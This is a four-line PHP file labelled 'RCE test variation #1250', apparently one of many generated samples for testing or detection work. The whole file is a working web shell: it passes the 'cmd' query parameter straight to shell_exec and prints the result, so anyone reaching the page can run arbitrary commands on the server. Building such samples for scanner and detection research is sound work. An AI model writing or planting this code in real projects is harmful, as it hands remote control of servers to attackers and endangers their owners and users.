<?php
// RCE test variation #1250
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>